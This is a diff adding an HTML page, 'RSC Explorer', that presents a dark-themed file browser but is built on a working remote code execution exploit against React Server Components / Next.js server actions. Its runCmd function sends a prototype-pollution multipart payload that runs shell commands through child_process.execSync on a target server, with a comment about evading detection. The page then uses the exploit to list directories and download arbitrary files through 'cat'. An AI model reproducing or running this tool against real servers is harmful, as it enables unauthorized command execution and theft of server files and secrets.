@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RSC File Explorer</title>
+    <style>
+        :root {
+            --bg-color: #1e1e1e;
+            --sidebar-bg: #252526;
+            --item-hover: #2a2d2e;
+            --text-color: #cccccc;
+            --accent-color: #007acc;
+            --border-color: #3e3e42;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            background-color: #333333;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .controls {
+            display: flex;
+            gap: 10px;
+            flex-grow: 1;
+        }
+
+        input[type="text"] {
+            background-color: #3c3c3c;
+            border: 1px solid var(--border-color);
+            color: white;
+            padding: 4px 8px;
+            border-radius: 2px;
+            flex-grow: 1;
+            font-family: monospace;
+        }
+
+        button {
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            cursor: pointer;
+            border-radius: 2px;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        button:disabled {
+            background-color: #555;
+            cursor: not-allowed;
+        }
+
+        main {
+            flex-grow: 1;
+            overflow: auto;
+            padding: 10px;
+        }
+
+        .file-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 4px 8px;
+            cursor: pointer;
+            border-radius: 2px;
+            user-select: none;
+        }
+
+        .file-item:hover {
+            background-color: var(--item-hover);
+        }
+
+        .icon {
+            margin-right: 8px;
+            width: 16px;
+            text-align: center;
+        }
+
+        .icon.folder { color: #dcb67a; }
+        .icon.file { color: #519aba; }
+
+        .status-bar {
+            background-color: var(--accent-color);
+            color: white;
+            font-size: 12px;
+            padding: 2px 10px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        #log {
+            font-family: monospace;
+            white-space: pre-wrap;
+            background: #111;
+            padding: 10px;
+            margin-top: 20px;
+            border: 1px solid #444;
+            display: none;
+            max-height: 200px;
+            overflow: auto;
+        }
+        
+        .error { color: #f48771; }
+        .success { color: #89d185; }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>RSC Explorer</h1>
+        <div class="controls">
+            <input type="text" id="pathInput" value="." placeholder="/path/to/dir">
+            <button id="btnGo">Go</button>
+            <button id="btnUp">Up</button>
+            <button id="btnSettings" title="Toggle Settings">⚙️</button>
+        </div>
+    </header>
+
+    <div id="settingsPanel" style="display:none; background:#252526; padding:10px; border-bottom:1px solid #444;">
+        <label>Target URL (relative or absolute): <input type="text" id="targetUrl" value="/"></label>
+    </div>
+
+    <main>
+        <ul id="fileList" class="file-list">
+            <!-- Items injected here -->
+        </ul>
+        <div id="log"></div>
+    </main>
+
+    <footer class="status-bar">
+        <span id="statusText">Ready</span>
+        <span id="itemCount">0 items</span>
+    </footer>
+
+    <script>
+        // State
+        let currentPath = ".";
+        let targetUrl = "/";
+
+        // Elements
+        const el = {
+            pathInput: document.getElementById('pathInput'),
+            btnGo: document.getElementById('btnGo'),
+            btnUp: document.getElementById('btnUp'),
+            fileList: document.getElementById('fileList'),
+            statusText: document.getElementById('statusText'),
+            itemCount: document.getElementById('itemCount'),
+            log: document.getElementById('log'),
+            targetUrlInfo: document.getElementById('targetUrl'),
+            settingsPanel: document.getElementById('settingsPanel'),
+            btnSettings: document.getElementById('btnSettings')
+        };
+
+        // UI Helpers
+        function log(msg, type = 'info') {
+            const div = document.createElement('div');
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            if (type === 'error') div.className = 'error';
+            if (type === 'success') div.className = 'success';
+            el.log.appendChild(div);
+            el.log.scrollTop = el.log.scrollHeight;
+            if (type === 'error') el.log.style.display = 'block';
+        }
+
+        function setStatus(msg) {
+            el.statusText.textContent = msg;
+        }
+
+        // --- RCE Core Logic (Adapted from RSC Detector) ---
+        async function runCmd(cmd) {
+            setStatus("Executing: " + cmd.substring(0, 20) + "...");
+            const finalTarget = el.targetUrlInfo.value;
+            
+            // Payload construction to evade simple detection and formatting issues
+            // We use the same payload structure as the extension
+            const targetCmd = cmd.replace(/\\/g, '\\\\').replace(/'/g, "\\'"); // Basic escape
+            
+            const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
+            
+            const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
+            const bodyParts = [
+                `--${boundary}`,
+                'Content-Disposition: form-data; name="0"',
+                '',
+                payloadJson,
+                `--${boundary}`,
+                'Content-Disposition: form-data; name="1"',
+                '',
+                '"$@0"',
+                `--${boundary}`,
+                'Content-Disposition: form-data; name="2"',
+                '',
+                '[]',
+                `--${boundary}--`,
+                ''
+            ].join('\r\n');
+
+            try {
+                const res = await fetch(finalTarget, {
+                    method: 'POST',
+                    headers: {
+                        'Next-Action': 'x', // Arbitrary action ID
+                        'Content-Type': `multipart/form-data; boundary=${boundary}`,
+                    },
+                    body: bodyParts
+                });
+
+                const text = await res.text();
+                
+                // Extract digest
+                const match = text.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);
+                if (match && match[1]) {
+                    // Decode logic
+                    let rawBase64 = match[1];
+                    let cleanBase64 = JSON.parse(`"${rawBase64}"`); // Unescape JSON string
+                    
+                    // Base64 decode binary safe
+                    const binaryString = atob(cleanBase64);
+                    // For display text, we need proper UTF8 decoding
+                    // For file downloads, we might want raw bytes, but textDecoder handles utf8 fine
+                    const output = new TextDecoder().decode(
+                        Uint8Array.from(binaryString, c => c.charCodeAt(0))
+                    );
+                    
+                    setStatus("Ready");
+                    return { success: true, output: output, rawBase64: cleanBase64 };
+                } else {
+                    log("Exploit failed. No digest found. Response preview: " + text.substring(0, 100), 'error');
+                    setStatus("Error");
+                    return { success: false, error: "Pattern not found" };
+                }
+
+            } catch (e) {
+                log("Network error: " + e.message, 'error');
+                setStatus("Network Error");
+                return { success: false, error: e.message };
+            }
+        }
+
+        // --- File System Functions ---
+
+        async function listDir(path) {
+            el.fileList.innerHTML = '<li style="padding:10px; color:#aaa;">Loading...</li>';
+            currentPath = path;
+            el.pathInput.value = path;
+
+            // ls -1pA: 1 column, p=append slash to dirs, A=all except . and ..
+            // We use 'ls -1pa' and filter . and .. manually to be safe or just show them
+            const res = await runCmd(`ls -1pa "${path}"`);
+            
+            el.fileList.innerHTML = ''; // Clear loading
+
+            if (res.success) {
+                const lines = res.output.split('\n').filter(x => x.trim() !== '');
+                let count = 0;
+
+                const createItem = (name, isDir) => {
+                    const li = document.createElement('li');
+                    li.className = 'file-item';
+                    
+                    const icon = document.createElement('span');
+                    icon.className = `icon ${isDir ? 'folder' : 'file'}`;
+                    icon.textContent = isDir ? '📁' : '📄';
+                    
+                    const text = document.createElement('span');
+                    text.textContent = name;
+                    
+                    li.appendChild(icon);
+                    li.appendChild(text);
+
+                    li.onclick = () => {
+                        if (isDir) {
+                            let newPath = path.endsWith('/') ? path + name : path + '/' + name;
+                            if (path === '.' && !name.startsWith('/')) newPath = name; // Basic fix
+                            if (path === '/') newPath = '/' + name;
+                            
+                            // Handling relative vs absolute logic is tricky without 'pwd', 
+                            // but we assume user provides absolute or we keep appending.
+                            // Better: just use what is in the input box as base.
+                            
+                            // If name is ../, handle it
+                            // But ls -p outputs name/
+                            
+                            listDir(newPath); // Recurse
+                        } else {
+                            downloadFile(path, name);
+                        }
+                    };
+                    
+                    el.fileList.appendChild(li);
+                    count++;
+                };
+
+                // Sort dirs first
+                lines.sort((a, b) => {
+                    const aDir = a.endsWith('/');
+                    const bDir = b.endsWith('/');
+                    if (aDir === bDir) return a.localeCompare(b);
+                    return aDir ? -1 : 1;
+                });
+
+                lines.forEach(line => {
+                    if (line === './' || line === '../') return; // Skip dots for cleaner UI
+                    createItem(line, line.endsWith('/'));
+                });
+                
+                el.itemCount.textContent = `${count} items`;
+            } else {
+                el.fileList.innerHTML = `<li style="color:#f48771; padding:10px;">Error: ${res.error}</li>`;
+            }
+        }
+
+        async function downloadFile(dir, filename) {
+            const fullPath = dir.endsWith('/') ? dir + filename : dir + '/' + filename;
+            const res = await runCmd(`cat "${fullPath}"`);
+            
+            if (res.success) {
+                // Trigger download
+                // We utilize the rawBase64 we got from the exploit logic to avoid double conversion issues with binary files
+                const blob = b64toBlob(res.rawBase64);
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                log(`Downloaded ${filename}`, 'success');
+            } else {
+                log(`Failed to download ${filename}`, 'error');
+            }
+        }
+
+        function b64toBlob(b64Data, contentType='', sliceSize=512) {
+            const byteCharacters = atob(b64Data);
+            const byteArrays = [];
+            for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+                const slice = byteCharacters.slice(offset, offset + sliceSize);
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                byteArrays.push(byteArray);
+            }
+            return new Blob(byteArrays, {type: contentType});
+        }
+
+        // --- Event Listeners ---
+
+        el.btnGo.addEventListener('click', () => {
+            listDir(el.pathInput.value);
+        });
+
+        el.pathInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') listDir(el.pathInput.value);
+        });
+
+        el.btnUp.addEventListener('click', () => {
+            // Simple string manipulation for "Up"
+            let p = el.pathInput.value;
+            if (p.endsWith('/')) p = p.slice(0, -1);
+            const lastSlash = p.lastIndexOf('/');
+            if (lastSlash > -1) {
+                let newPath = p.substring(0, lastSlash);
+                if (newPath === '') newPath = '/';
+                listDir(newPath);
+            } else {
+                listDir('.');
+            }
+        });
+
+        el.btnSettings.addEventListener('click', () => {
+            el.settingsPanel.style.display = el.settingsPanel.style.display === 'none' ? 'block' : 'none';
+        });
+
+        // Init
+        // listDir('.'); // Don't auto list on load to avoid noise if config is wrong
+        log("RSC Explorer Loaded. Set target if needed, then click Go.");
+    </script>
+</body>
+</html>
